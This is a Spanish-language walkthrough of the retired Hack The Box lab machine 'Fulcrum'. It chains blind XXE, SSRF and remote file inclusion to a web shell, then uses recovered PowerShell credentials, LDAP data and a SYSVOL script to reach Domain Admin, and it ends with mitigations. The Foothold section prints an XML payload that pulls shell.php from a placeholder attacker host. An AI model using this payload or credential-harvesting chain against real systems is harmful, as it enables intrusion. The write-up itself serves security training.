---
machine: Fulcrum
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, xxe, ssrf, pivoting, active-directory]
---

# Fulcrum — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La API de 56423 es vulnerable a XXE ciego. Se usa para SSRF contra el sitio de subidas en el puerto 4, que a su vez permite RFI y ejecución como `www-data`. Un script de PowerShell con credenciales cifradas da acceso WinRM a `WebUser`. La enumeración LDAP entrega credenciales de `BTables`, el file server y un script de SYSVOL con la cuenta `923a`, administrador del DC.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
4/tcp      http    nginx upload
22/tcp     ssh
80/tcp     http    nginx (502)
88/tcp     http    phpMyAdmin
9999/tcp   http    redirect
56423/tcp  http    Fulcrum-API
```

## Enumeración

- Cuatro sitios nginx y una API en 56423 con cabecera `Fulcrum-API`.
- La API procesa XML y devuelve solo `Ping` o `Pong`: XXE ciego.
- El sitio de subidas del puerto 4 incluye un parámetro `page`.
- El host tiene un segmento interno `192.168.122.0/24` con Windows.

## Foothold

Se usa un DTD externo para exfiltrar archivos por HTTP. La API puede alcanzar `localhost:4`, cuyo parámetro `page` carga una URL remota; se aloja un PHP malicioso y se obtiene ejecución como `www-data`.

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://localhost:4/?page=http://<ATTACKER>/shell.php">
<data>&send;</data>
```

## Movimiento lateral

`/var/www/uploads/Fulcrum_Upload_to_Corp.ps1` contiene una credencial cifrada de `WebUser`. Se descifra con PowerShell y se usa con `evil-winrm` a través de un túnel Chisel.

Desde `WebUser` se enumeran usuarios LDAP. El atributo `info` de `BTables` revela su contraseña; con ella se accede al file server y a SYSVOL del DC.

```powershell
$cred.GetNetworkCredential() | fl
```

## Escalada de privilegios

En SYSVOL hay scripts de login. Uno contiene la contraseña de `923a`, miembro de Domain Admins. Con `Invoke-Command` o WinRM se ejecuta código en el DC como esa cuenta y se lee la flag de root.

```powershell
Select-String -Path '\dc\SYSVOL\*\scripts\*.ps1' -Pattern '923a'
Invoke-Command -ComputerName dc -Credential $cred -ScriptBlock { whoami }
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales, si existen, viven en `private/` y no se publican.

## Lecciones aprendidas

- Un XXE ciego sigue siendo útil con un DTD externo.
- Un SSRF puede conectar dos servicios que no se hablan directamente.
- Los scripts de automatización contienen credenciales cifradas y reversibles.
- SYSVOL es legible por usuarios de dominio y suele guardar secretos.

## Mitigaciones y detección

- Deshabilitar entidades externas en el parser XML.
- Restringir el parámetro `page` a rutas locales y listas permitidas.
- No guardar credenciales en scripts; usar un vault y cuentas gestionadas.
- Auditar SYSVOL y aplicar contraseñas únicas por cuenta.

## Referencias

- [0xdf — Fulcrum](https://0xdf.gitlab.io/2022/05/11/htb-fulcrum.html)
- [Búsqueda de vídeos (CSV)](https://www.youtube.com/results?search_query=ippsec+fulcrum)
- [Búsqueda de writeups (CSV)](https://medium.com/search?q=hackthebox+fulcrum+writeup)
